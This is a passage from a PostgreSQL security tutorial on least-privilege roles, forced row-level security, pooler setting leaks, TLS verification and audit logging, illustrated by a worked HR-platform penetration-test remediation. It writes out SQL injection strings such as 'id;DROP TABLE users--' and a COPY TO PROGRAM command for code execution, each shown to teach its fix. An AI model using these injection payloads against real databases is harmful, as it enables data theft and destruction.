```
```sql
RESET ROLE;
ALTER TABLE app.invoices ★ FORCE ROW LEVEL SECURITY;
SET ROLE migrator;
SELECT count(*) FROM app.invoices;
```
```
 count
-------
   ★ 0        — now the owner is subject to it too.
```

**Prove `SET` leaks behind a pooler (Topic 65).**
```bash
psql -h 127.0.0.1 -p 6432 shop -U app_service \
  -c "SELECT set_config('app.tenant_id','1',false)" \
  -c "SELECT count(*) FROM app.invoices"
psql -h 127.0.0.1 -p 6432 shop -U app_service \
  -c "SELECT current_setting('app.tenant_id', true)"
```
```
 ★ 1        — ★ A DIFFERENT CLIENT INHERITED TENANT 1'S SETTING.
   ⇒ ★ THIS IS A CROSS-TENANT BREACH CAUSED BY A POOLING MODE.
```
```sql
-- ★ the fix: SET LOCAL / is_local = true, inside a transaction
BEGIN;
SELECT set_config('app.tenant_id','1', ★ true);
SELECT count(*) FROM app.invoices;
COMMIT;
-- ★ reverted at COMMIT. Cannot leak.
```

**Prove RLS needs an index.**
```sql
RESET ROLE;
INSERT INTO app.invoices (tenant_id, number, total_minor)
SELECT (random()*1000)::bigint, 'INV-'||g, g FROM generate_series(1,2000000) g;
DROP INDEX app.invoices_tenant_id_id_idx;
VACUUM ANALYZE app.invoices;

SET ROLE app_service;
SELECT set_config('app.tenant_id','42', false);
EXPLAIN (ANALYZE) SELECT * FROM app.invoices WHERE number = 'INV-500000';
```
```
 ★ Seq Scan on invoices  (actual rows=1)
   ★ Filter: ((tenant_id = 42) AND (number = 'INV-500000'))
   ★ Rows Removed by Filter: 2,000,003
 Execution Time: ★ 412.8 ms
```
```sql
RESET ROLE;
CREATE INDEX ON app.invoices (tenant_id, number);
SET ROLE app_service;
EXPLAIN (ANALYZE) SELECT * FROM app.invoices WHERE number = 'INV-500000';
```
```
 ★ Index Scan using invoices_tenant_id_number_idx
 Execution Time: ★ 0.084 ms       ★ 4,914×
   ⇒ ★ tenant_id MUST LEAD every index on an RLS table.
```

**Column grants.**
```sql
RESET ROLE;
CREATE TABLE app.users (id bigserial PRIMARY KEY, name text,
                        email text, ★ password_hash text);
ALTER TABLE app.users OWNER TO migrator;
GRANT SELECT (id, name, email) ON app.users TO app_read;   -- ★ not the hash

SET ROLE reporting;
SELECT id, name FROM app.users;      -- ✓
SELECT * FROM app.users;
```
```
 ★ ERROR:  permission denied for table users
   ★ SELECT * FAILS LOUDLY rather than returning the hash.
```

**The `security_invoker` view trap.**
```sql
RESET ROLE;
-- ✗ the default: the view runs as its OWNER ⇒ ★ RLS BYPASSED
CREATE VIEW app.all_invoices AS SELECT * FROM app.invoices;
ALTER VIEW app.all_invoices OWNER TO migrator;
GRANT SELECT ON app.all_invoices TO app_read;

SET ROLE reporting;
SELECT count(*) FROM app.all_invoices;
```
```
 count
-------
 ★ 2000004        — ★ EVERY TENANT. The view bypassed RLS.
```
```sql
RESET ROLE;
ALTER VIEW app.all_invoices SET (★ security_invoker = true);
SET ROLE reporting;
SELECT set_config('app.tenant_id','42', false);
SELECT count(*) FROM app.all_invoices;
```
```
 count
-------
   ★ 1994        — ★ RLS now applies through the view.
```

**Injection: values vs identifiers.**
```js
// ★ VALUES — safe
await pool.query('SELECT * FROM app.users WHERE email = $1',
                 ["' OR 1=1--"]);          // ★ returns 0 rows

// ✗ IDENTIFIERS — the parameter does not work here
const sort = req.query.sort;                // "id;DROP TABLE users--"
await pool.query(`SELECT * FROM app.invoices ORDER BY ${sort}`);   // ★ BOOM

// ✓ AN ALLOWLIST — the only safe option
const SORTS = { created: 'created_at DESC', total: 'total_minor DESC',
                number: 'number ASC' };
const orderBy = SORTS[req.query.sort] ?? SORTS.created;
await pool.query(`SELECT * FROM app.invoices ORDER BY ${orderBy}`);
```
```sql
-- ★ or server-side, with format('%I')
CREATE FUNCTION app.list_sorted(col text) RETURNS SETOF app.invoices AS $$
BEGIN
  IF col NOT IN ('created_at','total_minor','number') THEN
    RAISE EXCEPTION '★ invalid sort column: %', col;
  END IF;
  RETURN QUERY EXECUTE format('SELECT * FROM app.invoices ORDER BY %I', col);
END $$ LANGUAGE plpgsql;
```

**Prove privilege decides severity.**
```sql
SET ROLE app_service;
DROP TABLE app.invoices;
```
```
 ★ ERROR:  must be owner of table invoices
```
```sql
COPY (SELECT 1) TO PROGRAM 'id';
```
```
 ★ ERROR:  permission denied for function copy_to_program
   ★ AS SUPERUSER THIS WOULD BE REMOTE CODE EXECUTION.
```

**Audit writes without letting the app forge them.**
```sql
RESET ROLE;
CREATE SCHEMA audit;
CREATE TABLE audit.row_changes (
  id bigserial PRIMARY KEY, table_name text, row_id text, action text,
  old_data jsonb, new_data jsonb, actor text, db_user text DEFAULT current_user,
  at timestamptz DEFAULT now());
-- (the trigger function from "How it works", SECURITY DEFINER)
REVOKE ALL ON audit.row_changes FROM app_write;

SET ROLE app_service;
SELECT set_config('app.actor','user:8842', false);
SELECT set_config('app.tenant_id','1', false);
UPDATE app.invoices SET total_minor = 999 WHERE tenant_id = 1 AND id = 1;
SELECT table_name, action, actor, db_user, old_data->>'total_minor' AS old
  FROM audit.row_changes ORDER BY id DESC LIMIT 1;
```
```
 table_name | action |   actor    |  db_user    | old
------------+--------+------------+-------------+-----
 invoices   | UPDATE | ★ user:8842| app_service | 100
```
```sql
DELETE FROM audit.row_changes;
```
```
 ★ ERROR:  permission denied for table row_changes
   ★ THE APPLICATION CAN WRITE AUDIT ROWS BUT NOT ERASE THEM.
```

**Check TLS is actually verifying.**
```sql
SELECT ssl, version, cipher, client_addr
  FROM pg_stat_ssl JOIN pg_stat_activity USING (pid)
 WHERE pid = pg_backend_pid();
```
```
 ssl | version |         cipher         | client_addr
-----+---------+------------------------+-------------
 t   | TLSv1.3 | TLS_AES_256_GCM_SHA384 | 10.0.1.44
```
```bash
# ★ sslmode=require accepts ANY certificate
psql "host=pg sslmode=require dbname=shop" -c "SELECT 1"      # ✓
# ★ verify-full checks the CA and the hostname
psql "host=pg sslmode=verify-full sslrootcert=/etc/ssl/ca.crt" -c "SELECT 1"
```

---

## Example 2 — production scenario

**The situation.** A multi-tenant HR platform. 2,400 companies, employee records, salaries, performance reviews. A penetration test is scheduled.

```
 THE ARCHITECTURE AS FOUND
   one database role: ★ `app`, ★ owner of every table
   tenant isolation:  ★ a WHERE clause in application code
   TLS:               ★ sslmode=require
   audit:             ★ log_statement = 'all'  (★ 41 GB/day)
   RLS:               ★ none
   backups:           ★ encrypted, ★ key stored in the app's
                        settings table
```

**Step 1 — what the penetration test found.**

```
 ★ FINDING 1 (CRITICAL) — cross-tenant data access
   GET /api/employees?sort=salary
   ⇒ the sort parameter is interpolated. Injecting
     `salary; SELECT * FROM employees--` returned ★ ALL 2,400
     TENANTS' EMPLOYEE RECORDS, including salaries.
   ⇒ ★ AND: because `app` OWNS the tables, adding RLS later would
     have done nothing without FORCE.

 ★ FINDING 2 (CRITICAL) — one missing WHERE clause
   an audit of 1,840 queries found ★ 11 without a tenant filter.
   ⇒ ★ three were in background jobs, two in an export endpoint,
     one in a webhook handler — ★ code paths the main review
     had not covered.

 ★ FINDING 3 (HIGH) — TLS not verified
   sslmode=require accepts any certificate.
   ⇒ ★ a MITM on the internal network succeeded in the test.

 ★ FINDING 4 (HIGH) — the backup key
   stored in `app_settings` ★ inside the database being backed up.
   ⇒ ★ the backups were undecryptable without a working database,
     which is exactly the situation you restore in.

 ★ FINDING 5 (MEDIUM) — PII in logs
   log_statement='all' wrote every salary and national ID number
   into logs retained for 90 days and shipped to a third-party
   log service.
```

**Step 2 — the role redesign.**

```sql
-- ★ ① the application must own nothing
CREATE ROLE hr_owner NOLOGIN;
CREATE ROLE hr_app   NOLOGIN;
CREATE ROLE hr_read  NOLOGIN;

CREATE ROLE svc_api      LOGIN PASSWORD :'p1' IN ROLE hr_app;
CREATE ROLE svc_jobs     LOGIN PASSWORD :'p2' IN ROLE hr_app;
CREATE ROLE svc_reports  LOGIN PASSWORD :'p3' IN ROLE hr_read;
CREATE ROLE migrator     LOGIN PASSWORD :'p4' IN ROLE hr_owner;
CREATE ROLE auditor      LOGIN PASSWORD :'p5';

-- ★ ② transfer ownership away from the application role
REASSIGN OWNED BY app TO hr_owner;
ALTER SCHEMA hr OWNER TO hr_owner;

-- ★ ③ least privilege
REVOKE ALL ON SCHEMA public FROM PUBLIC;
GRANT USAGE ON SCHEMA hr TO hr_app, hr_read;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA hr TO hr_app;
GRANT SELECT ON ALL TABLES IN SCHEMA hr TO hr_read;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA hr TO hr_app;

ALTER DEFAULT PRIVILEGES ★ FOR ROLE migrator IN SCHEMA hr
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO hr_app;
ALTER DEFAULT PRIVILEGES FOR ROLE migrator IN SCHEMA hr
  GRANT SELECT ON TABLES TO hr_read;

-- ★ ④ per-role limits (Topics 45, 47, 65)
ALTER ROLE svc_reports SET default_transaction_read_only = on;
ALTER ROLE svc_reports SET statement_timeout = '180s';
ALTER ROLE svc_api     SET statement_timeout = '5s';
ALTER ROLE svc_api     SET idle_in_transaction_session_timeout = '10s';
ALTER ROLE svc_jobs    SET statement_timeout = '300s';

-- ★ ⑤ salaries are not readable by the reporting role at all
REVOKE SELECT ON hr.employees FROM hr_read;
GRANT SELECT (id, tenant_id, name, department, hired_at, manager_id)
  ON hr.employees TO hr_read;
```

**Step 3 — RLS on every tenant-scoped table.**

```sql
DO $$
DECLARE t record;
BEGIN
  FOR t IN SELECT tablename FROM pg_tables
            WHERE schemaname='hr'
              AND EXISTS (SELECT 1 FROM information_schema.columns c
                           WHERE c.table_schema='hr' AND c.table_name=tablename
                             AND c.column_name='tenant_id')
  LOOP
    EXECUTE format('ALTER TABLE hr.%I ENABLE ROW LEVEL SECURITY', t.tablename);
    EXECUTE format('ALTER TABLE hr.%I ★ FORCE ROW LEVEL SECURITY', t.tablename);

    EXECUTE format($f$
      CREATE POLICY t_sel ON hr.%I FOR SELECT
        USING (tenant_id = current_setting('app.tenant_id', ★ true)::bigint)$f$,
      t.tablename);
    EXECUTE format($f$
      CREATE POLICY t_ins ON hr.%I FOR INSERT
        ★ WITH CHECK (tenant_id = current_setting('app.tenant_id', true)::bigint)$f$,
      t.tablename);
    EXECUTE format($f$
      CREATE POLICY t_upd ON hr.%I FOR UPDATE
        USING      (tenant_id = current_setting('app.tenant_id', true)::bigint)
        ★ WITH CHECK (tenant_id = current_setting('app.tenant_id', true)::bigint)$f$,
      t.tablename);
    EXECUTE format($f$
      CREATE POLICY t_del ON hr.%I FOR DELETE
        USING (tenant_id = current_setting('app.tenant_id', true)::bigint)$f$,
      t.tablename);

    -- ★ THE INDEX RLS REQUIRES
    EXECUTE format(
      'CREATE INDEX IF NOT EXISTS %I ON hr.%I (tenant_id)',
      t.tablename||'_tenant_idx', t.tablename);
  END LOOP;
END $$;
```

**Step 4 — and the audit that proves every index leads with `tenant_id`.**

```sql
-- ★ RLS turns a missing tenant_id index into a full table scan
--   on EVERY query. This audit is mandatory after enabling it.
SELECT c.relname AS table_name, i.relname AS index_name,
       pg_get_indexdef(i.oid) AS def
  FROM pg_class c
  JOIN pg_index ix ON ix.indrelid = c.oid
  JOIN pg_class i  ON i.oid = ix.indexrelid
  JOIN pg_namespace n ON n.oid = c.relnamespace
 WHERE n.nspname = 'hr'
   AND EXISTS (SELECT 1 FROM information_schema.columns
                WHERE table_schema='hr' AND table_name=c.relname
                  AND column_name='tenant_id')
   AND pg_get_indexdef(i.oid) NOT LIKE '%(tenant_id%'
   AND NOT ix.indisprimary;
```
```
        table_name        |       index_name        |        def
--------------------------+-------------------------+--------------------
 ★ performance_reviews    | pr_employee_idx         | … (employee_id)
 ★ payroll_runs           | payroll_period_idx      | … (period_start)
   ★ 14 INDEXES DID NOT LEAD WITH tenant_id.
   ⇒ ★ each one became a filtered scan under RLS.
   ⇒ rebuilt as (tenant_id, <original columns>).
```

**Step 5 — the application changes.**

```js
// ★ ① SET LOCAL, inside a transaction, always (Topic 65)
async function withTenant(tenantId, actorId, fn) {
  return withTransaction(async (tx) => {
    await tx.query('SELECT set_config($1,$2,★ true)',
                   ['app.tenant_id', String(tenantId)]);
    await tx.query('SELECT set_config($1,$2,true)',
                   ['app.actor', `user:${actorId}`]);
    return fn(tx);
  });
}

// ★ ② the tenant comes from the VERIFIED JWT, never from a header
app.use(async (req, res, next) => {
  const claims = await verifyJwt(req.get('authorization'));
  if (!claims) return res.status(401).end();
  req.tenantId = claims.tenant_id;      // ★ signed, not user-supplied
  req.actorId  = claims.sub;
  req.db = (fn) => withTenant(req.tenantId, req.actorId, fn);
  next();
});

// ★ ③ the allowlist for every dynamic identifier
const EMPLOYEE_SORTS = Object.freeze({
  name:       'name ASC',
  hired:      'hired_at DESC',
  department: 'department ASC, name ASC',
});
app.get('/api/employees', async (req, res) => {
  const orderBy = EMPLOYEE_SORTS[req.query.sort] ?? EMPLOYEE_SORTS.name;
  const rows = await req.db(tx =>
    tx.query(`SELECT id, name, department, hired_at
                FROM hr.employees ORDER BY ${orderBy} LIMIT 100`));
  res.json(rows.rows);
});
```

```js
// ★ ④ TLS verification
const pool = new Pool({
  host: 'pg-primary.internal',
  ssl: {
    ★ rejectUnauthorized: true,
    ca: fs.readFileSync('/etc/ssl/certs/internal-ca.crt'),
    servername: 'pg-primary.internal',
  },
});
```

**Step 6 — audit, and getting PII out of the logs.**

```ini
# ★ replace log_statement='all' with pgaudit
shared_preload_libraries = 'pgaudit,pg_stat_statements'
log_statement = ★ 'none'
pgaudit.log = 'write, ddl, role'
pgaudit.log_relation = on
★ pgaudit.log_parameter = off        # ★ keeps salaries out of logs
pgaudit.log_catalog = off
```
```sql
-- ★ OBJECT auditing: audit ONLY the sensitive tables, in full
CREATE ROLE pgaudit_obj NOLOGIN;
ALTER SYSTEM SET pgaudit.role = 'pgaudit_obj';
GRANT SELECT, UPDATE, DELETE ON hr.salaries TO pgaudit_obj;
GRANT SELECT ON hr.performance_reviews TO pgaudit_obj;
-- ⇒ ★ reads of salaries are logged; reads of the org chart are not.
--   ★ 41 GB/day → 340 MB/day, and no PII values.
```
```sql
-- ★ plus the row-level audit trail for writes, which the
--   application cannot forge or erase
CREATE TRIGGER audit_salaries AFTER INSERT OR UPDATE OR DELETE
  ON hr.salaries FOR EACH ROW EXECUTE FUNCTION audit.log_change();
REVOKE ALL ON audit.row_changes FROM hr_app, hr_read;
GRANT SELECT ON audit.row_changes TO auditor;
```

**Step 7 — the backup key, moved out.**

```bash
# ✗ before: the key lived in hr.app_settings
# ✓ after: AWS KMS, with its own recovery procedure
export WALG_LIBSODIUM_KEY="$(aws kms decrypt \
  --ciphertext-blob fileb:///etc/wal-g/key.enc \
  --query Plaintext --output text | base64 -d)"
```
```
 ★ AND THE TEST THAT MAKES IT REAL (Topic 64):
   the nightly restore test now runs on a host with NO access to
   the production database, ★ fetching the key from KMS.
   ⇒ ★ it would have failed on day one under the old design.
```

**Step 8 — verify with tests, not with review.**

```js
// ★ ① a test that proves cross-tenant access is impossible
test('RLS blocks cross-tenant reads', async () => {
  const a = await createInvoice({ tenantId: 1 });
  const rows = await withTenant(2, 'test', tx =>
    tx.query('SELECT * FROM hr.employees WHERE id = $1', [a.id]));
  expect(rows.rowCount).toBe(0);           // ★ not filtered — unreachable
});

// ★ ② a test that proves it fails CLOSED
test('no tenant set ⇒ zero rows', async () => {
  const rows = await pool.query('SELECT count(*) FROM hr.employees');
  expect(Number(rows.rows[0].count)).toBe(0);
});

// ★ ③ a test that proves the app role cannot escalate
test('app role cannot DDL', async () => {
  await expect(appPool.query('DROP TABLE hr.employees'))
    .rejects.toThrow(/must be owner/);
});

// ★ ④ a CI check that every tenant-scoped table has RLS forced
test('every tenant table has FORCE RLS', async () => {
  const { rows } = await pool.query(`
    SELECT c.relname FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
     WHERE n.nspname='hr' AND c.relkind='r'
       AND EXISTS (SELECT 1 FROM information_schema.columns
                    WHERE table_schema='hr' AND table_name=c.relname
                      AND column_name='tenant_id')
       AND NOT (c.relrowsecurity AND c.relforcerowsecurity)`);
  expect(rows).toEqual([]);      // ★ fails CI if a new table is added
});
```

**Step 9 — results.**

| | Before | After |
|---|---|---|
| Application role | ★ owner of everything | ★ **owns nothing, no DDL** |
| Tenant isolation | ★ a `WHERE` clause | ★ **RLS + `FORCE`, fails closed** |
| Queries missing a tenant filter | ★ **11 of 1,840** | ★ **irrelevant — unreachable** |
| Injection via `ORDER BY` | ★ full cross-tenant read | ★ **rejected as an invalid parameter** |
| Injection severity as app role | ★ `DROP TABLE`, all tenants | ★ **one tenant's rows, PITR-recoverable** |
| TLS | ★ `require` (MITM succeeded) | ★ **`verify-full`** |
| Logs | ★ 41 GB/day, PII in plaintext | ★ **340 MB/day, no values** |
| Audit trail | ★ app could delete it | ★ **`SECURITY DEFINER`, append-only** |
| Backup key | ★ inside the database | ★ **KMS, restore-tested** |
| Indexes not leading with `tenant_id` | ★ 14 | **0** |
| Regression protection | ★ code review | ★ **4 CI tests** |

```
 ★ SIX LESSONS:
 ① ★ 11 OF 1,840 QUERIES WERE MISSING A TENANT FILTER, and three
   were in background jobs the review never covered. ★ RLS makes
   the count irrelevant: the rows are unreachable, not unfiltered.
 ② ★ THE APPLICATION OWNED EVERY TABLE, which meant RLS would
   have silently done nothing without FORCE. ★ The most common
   way RLS is deployed and does not work.
 ③ ★ THE INJECTION WAS IN `ORDER BY` — an identifier, which
   cannot be parameterised. ★ An allowlist is the only fix.
 ④ ★ ENABLING RLS TURNED 14 INDEXES INTO FILTERED SCANS.
   `tenant_id` must LEAD every index on an RLS table, and the
   audit for that is mandatory, not optional.
 ⑤ ★ `sslmode=require` ENCRYPTS BUT DOES NOT AUTHENTICATE.
   The MITM succeeded during the test.
 ⑥ ★ THE BACKUP KEY WAS INSIDE THE DATABASE BEING BACKED UP.
   The nightly restore test (Topic 64) would have caught it
   on day one — and now does.
```

---

## Common mistakes

**1. The application connecting as an owner or superuser.**
- *Symptom:* an injection becomes `DROP TABLE`, or `COPY … FROM PROGRAM` (remote code execution).
- *Fix:* the app role owns nothing and cannot create. Migrations run as a separate role.

**2. Enabling RLS without `FORCE`.**
- *Symptom:* RLS appears configured and does nothing, because the app is the table owner.
- *Fix:* `ALTER TABLE … FORCE ROW LEVEL SECURITY`, and verify with a CI test.

**3. A policy with `USING` but no `WITH CHECK`.**
- *Symptom:* a tenant can insert rows belonging to another tenant, then not see them.
- *Fix:* separate policies per command, with both clauses written explicitly.

**4. `current_setting('app.tenant_id')` without the `true` argument.**
- *Symptom:* an unset variable raises an error rather than returning no rows.
- *Fix:* the two-argument form, so the policy matches nothing and **fails closed**.

**5. `SET` instead of `SET LOCAL` behind a transaction-mode pooler.**
- *Symptom:* one tenant's setting leaks to the next request — a cross-tenant breach caused by a pooling mode.
- *Fix:* `set_config(…, true)` inside a transaction, always (Topic 65).

**6. Enabling RLS without auditing indexes.**
- *Symptom:* every query becomes a filtered sequential scan; 4,900× slower.
- *Fix:* `tenant_id` must be the leading column on every index of an RLS table.

**7. A view without `security_invoker`.**
- *Symptom:* the view runs as its owner and bypasses RLS entirely.
- *Fix:* `WITH (security_invoker = true)` on PG 15+; on older versions, avoid views over RLS tables.

**8. Trying to parameterise an identifier.**
- *Symptom:* `ORDER BY $1` doesn't work, so someone interpolates.
- *Fix:* an allowlist. Never a regex sanitiser.

**9. `sslmode=require`.**
- *Symptom:* encrypted traffic that any MITM certificate can terminate.
- *Fix:* `verify-full`, with the CA and the hostname checked.

**10. `log_statement = 'all'` for audit.**
- *Symptom:* PII in plaintext logs shipped to a third party, at enormous volume, and still no record of which rows were read.
- *Fix:* `pgaudit` with `log_parameter = off`, plus object auditing for sensitive tables.

**11. An audit table the application can write to freely.**
- *Symptom:* the trail can be forged or erased by the same credential that caused the incident.
- *Fix:* a `SECURITY DEFINER` trigger; revoke direct access.

**12. The encryption key inside the database it protects.**
- *Symptom:* backups that cannot be decrypted in exactly the situation you need them.
- *Fix:* a KMS with its own recovery procedure — and a restore test that proves it (Topic 64).

**13. `PUBLIC` retaining `CREATE` on `public` (PG < 15).**
- *Symptom:* any role can create objects, including functions that shadow built-ins.
- *Fix:* `REVOKE CREATE ON SCHEMA public FROM PUBLIC`.

**14. Relying on code review for tenant isolation.**
- *Symptom:* 11 of 1,840 queries missing a filter, concentrated in code paths review didn't cover.
- *Fix:* make it structurally impossible, and add CI tests that fail when a new table lacks RLS.

---

## Hands-on proof

**PROVE IT #1–#12 — Example 1** (default privileges not being retroactive, RLS blocking cross-tenant reads and failing closed when unset, `WITH CHECK` preventing cross-tenant inserts and its absence allowing them, the owner bypassing RLS until `FORCE`, `SET` leaking through a pooler, RLS without an index costing 4,914×, column grants making `SELECT *` fail loudly, the `security_invoker` view trap, values-vs-identifiers injection, privilege deciding severity, and an append-only audit trail).

**PROVE IT #13 — find every over-privileged role.**
```sql
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolbypassrls, rolcanlogin
  FROM pg_roles WHERE rolsuper OR rolcreaterole OR rolbypassrls
 ORDER BY rolsuper DESC;
```
```
   rolname   | rolsuper | rolcreaterole | rolbypassrls | rolcanlogin
-------------+----------+---------------+--------------+-------------
 postgres    | ★ t      | t             | t            | t
 ★ app       | f        | ★ t           | f            | ★ t
   ★ a LOGIN role with CREATEROLE is an escalation path (PG16+ can
     grant itself membership in other roles).
```

**PROVE IT #14 — find tables missing RLS.**
```sql
SELECT c.relname,
       c.relrowsecurity AS rls_enabled,
       c.relforcerowsecurity AS rls_forced
  FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
 WHERE n.nspname='hr' AND c.relkind='r'
   AND EXISTS (SELECT 1 FROM information_schema.columns
                WHERE table_schema='hr' AND table_name=c.relname
                  AND column_name='tenant_id')
   AND NOT (c.relrowsecurity AND c.relforcerowsecurity);
```

**PROVE IT #15 — find grants to `PUBLIC`.**
```sql
SELECT table_schema, table_name, privilege_type
  FROM information_schema.role_table_grants
 WHERE grantee = 'PUBLIC';
SELECT nspname, nspacl FROM pg_namespace WHERE nspacl::text LIKE '%=UC/%';
```

**PROVE IT #16 — confirm connections are actually using TLS.**
```sql
SELECT a.usename, a.client_addr, s.ssl, s.version, s.cipher
  FROM pg_stat_activity a LEFT JOIN pg_stat_ssl s USING (pid)
 WHERE a.backend_type='client backend';
```
```
 usename | client_addr | ssl | version
---------+-------------+-----+----------
 svc_api | 10.0.1.44   | ★ t | TLSv1.3
 ★ legacy| 10.0.3.19   | ★ f | ★ (null)     — plaintext. Find it.
```

---

## The design decision framework

```
★★★ THE DATABASE IS THE LAST COMPONENT THAT KNOWS THE TRUTH.
    IF IT ENFORCES NOTHING, EVERY LAYER ABOVE MUST BE PERFECT
    FOREVER. ★★★

 ① ★ LEAST PRIVILEGE — START HERE, IT COSTS NOTHING
    ✓ ★ the app role OWNS NOTHING and cannot CREATE
    ✓ migrations run as a SEPARATE role, from a separate process
    ✓ reporting is READ ONLY, with a statement_timeout
    ✓ ★ REVOKE ALL ON SCHEMA public FROM PUBLIC  (PG < 15)
    ✓ ★ ALTER DEFAULT PRIVILEGES ★ FOR ROLE <migrator>
       (not retroactive, and per creating role)
    ⇒ ★ THIS ALONE TURNS "DROP TABLE + RCE" INTO "one tenant's
      rows, recoverable from PITR".

 ② ★ RLS FOR EVERY TENANT-SCOPED TABLE
    ✓ ENABLE **and** ★ FORCE ROW LEVEL SECURITY
    ✓ ★ separate policies per command, with BOTH `USING` and
       `WITH CHECK`
    ✓ ★ current_setting('app.tenant_id', ★ true) ⇒ FAILS CLOSED
    ✓ ★ SET LOCAL / set_config(…, true) inside a transaction (65)
    ✓ ★ AUDIT INDEXES: tenant_id must LEAD every index
    ✓ ★ views need `security_invoker = true` or they bypass RLS
    ⇒ ★ RLS is the ONLY layer that survives a forgotten WHERE
      clause in a background job nobody reviewed.

 ③ ★ INJECTION — TWO DIFFERENT PROBLEMS
    ★ VALUES     ⇒ parameters. Structurally safe.
    ★ IDENTIFIERS ⇒ ★ CANNOT be parameterised ⇒ ★ AN ALLOWLIST
       (ORDER BY, dynamic table/column names — ★ where modern
       injections live)
    ★ LIKE patterns ⇒ escape %, _ and \ (a DoS vector)
    ✗ never a regex sanitiser

 ④ ★ ENCRYPTION — THREE SEPARATE PROBLEMS
    in flight ⇒ ★ hostssl + sslmode=★ verify-full
       (`require` encrypts but does NOT authenticate)
    at rest   ⇒ volume encryption; ★ a stolen-disk control only
    columns   ⇒ encrypt in the APPLICATION, keys from a KMS;
                ★ accept that the column is opaque to SQL
    ★ backups ⇒ ★ THE KEY MUST NOT LIVE IN THE DATABASE IT
                PROTECTS. Prove it with the restore test (64).

 ⑤ ★ AUDIT — ANSWER "WHAT DID THEY REACH?"
    ✗ log_statement='all' ⇒ ★ PII in logs, huge volume, and it
      still doesn't say which rows were read
    ✓ ★ pgaudit, ★ log_parameter = off, object auditing for the
      sensitive tables only
    ✓ ★ a SECURITY DEFINER trigger ⇒ the app can WRITE the trail
      but not FORGE or DELETE it
    ✓ partition the audit table; retention by DROP (59)
    ⇒ ★ reads are hard to audit ⇒ the real control is RLS
      (they couldn't) not audit (we know they did).

 ⑥ ★ VERIFY WITH TESTS, NOT WITH REVIEW
    ✓ cross-tenant read returns 0 rows
    ✓ ★ no tenant set ⇒ 0 rows (fails closed)
    ✓ the app role cannot DDL
    ✓ ★ a CI check that every tenant table has RLS **forced**
    ⇒ ★ code review found 11 of 1,840 missing filters. Tests find
      the twelfth, and the one added next month.

 ⑦ ★ THE AUDIT QUERIES TO RUN ON ANY SYSTEM YOU INHERIT
    roles with SUPERUSER / CREATEROLE / BYPASSRLS
    grants to PUBLIC
    tenant-scoped tables without forced RLS
    indexes not leading with tenant_id
    connections without SSL
    ⇒ ★ five queries, and they find most problems.
```

---

## Practice exercises

### Exercise 1 — easy (concept check)
Build a role hierarchy where the application owns nothing. Then: (a) prove default privileges are not retroactive and fix it; (b) enable RLS and prove cross-tenant reads return zero rows; (c) prove it fails closed when the setting is unset; (d) prove the owner bypasses RLS until you add `FORCE`.

### Exercise 2 — medium (apply it)
Demonstrate and fix each: (a) a `WITH CHECK`-less policy allowing cross-tenant inserts; (b) `SET` leaking through a transaction-mode pooler; (c) RLS without a leading `tenant_id` index, with the measured cost; (d) a view bypassing RLS without `security_invoker`; (e) an `ORDER BY` injection, fixed with an allowlist.

For (c), report the `EXPLAIN` output before and after.

### Exercise 3 — hard (production simulation)
A multi-tenant HR platform fails a penetration test with five findings: cross-tenant access via an `ORDER BY` injection, 11 of 1,840 queries missing a tenant filter, `sslmode=require` allowing a MITM, the backup key stored inside the database, and PII in 41 GB/day of logs.

(a) Explain why adding RLS to the existing setup would have done nothing, and what one clause fixes it.
(b) The injection was in `ORDER BY`. Explain why parameterisation cannot help and give the only safe fix.
(c) Design the role hierarchy. Justify why the application must own nothing, using the four-privilege-level severity comparison.
(d) Write the script that enables RLS on every tenant-scoped table with all four policies. Explain why `current_setting(…, true)` matters.
(e) Enabling RLS made 14 indexes useless. Write the audit query that finds them and explain the mechanism.
(f) Three of the 11 missing filters were in background jobs. Explain why review missed them and why RLS makes the count irrelevant.
(g) Replace `log_statement='all'` with something that answers "who read salaries?" without putting salaries in logs.
(h) Design the audit trail so the application can write it but not erase it.
(i) The backup key was inside the database. Explain the failure mode precisely, and which existing test would have caught it.
(j) Write the four CI tests that prevent regression, and explain why each is stronger than a review checklist.

---

## Mental model checkpoint

1. Name the six layers. Which do most applications have?
2. Why does RLS survive a forgotten `WHERE` clause when application filtering does not?
3. What is the difference between `USING` and `WITH CHECK`? What breaks without the latter?
4. Why does RLS silently do nothing for the table owner, and what fixes it?
5. Why must `current_setting` take a second argument of `true`?
6. Why is `SET` unsafe behind a transaction-mode pooler, and what is the fix?
7. What must be true of every index on an RLS-protected table, and why?
8. Which injection case cannot be fixed with parameters? What is the only safe approach?
9. Compare the severity of one injection at four privilege levels.
10. What does `sslmode=require` guarantee, and what does it not?
11. Why is `log_statement = 'all'` a poor audit mechanism? Name three reasons.
12. Why must the backup encryption key live outside the database?
13. Why are tests better than review for tenant isolation?

---

## Quick reference card

**Least privilege**
```sql
REVOKE ALL ON SCHEMA public FROM PUBLIC;      -- ★ PG < 15
ALTER SCHEMA app OWNER TO migrator;           -- ★ app owns NOTHING
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA app TO app_write;
ALTER DEFAULT PRIVILEGES ★ FOR ROLE migrator IN SCHEMA app
  GRANT SELECT ON TABLES TO app_read;         -- ★ not retroactive
ALTER ROLE reporting SET default_transaction_read_only = on;
```

**RLS**
```sql
ALTER TABLE t ENABLE ROW LEVEL SECURITY;
ALTER TABLE t ★ FORCE ROW LEVEL SECURITY;      -- ★ the owner too
CREATE POLICY p_sel ON t FOR SELECT
  USING (tenant_id = current_setting('app.tenant_id', ★ true)::bigint);
CREATE POLICY p_ins ON t FOR INSERT
  ★ WITH CHECK (tenant_id = current_setting('app.tenant_id', true)::bigint);
CREATE INDEX ON t (★ tenant_id, …);            -- ★ tenant_id LEADS
CREATE VIEW v WITH (★ security_invoker = true) AS SELECT … FROM t;
```
```js
await tx.query('SELECT set_config($1,$2,★ true)', ['app.tenant_id', id]);
// ★ SET LOCAL inside a transaction — never plain SET (Topic 65)
```

**Injection:** values ⇒ **parameters** · ★ identifiers ⇒ **an allowlist** (`ORDER BY`, table names) · `LIKE` ⇒ escape `% _ \`.

**TLS:** `hostssl` in `pg_hba` · ★ `sslmode=verify-full` (**`require` does not authenticate**).

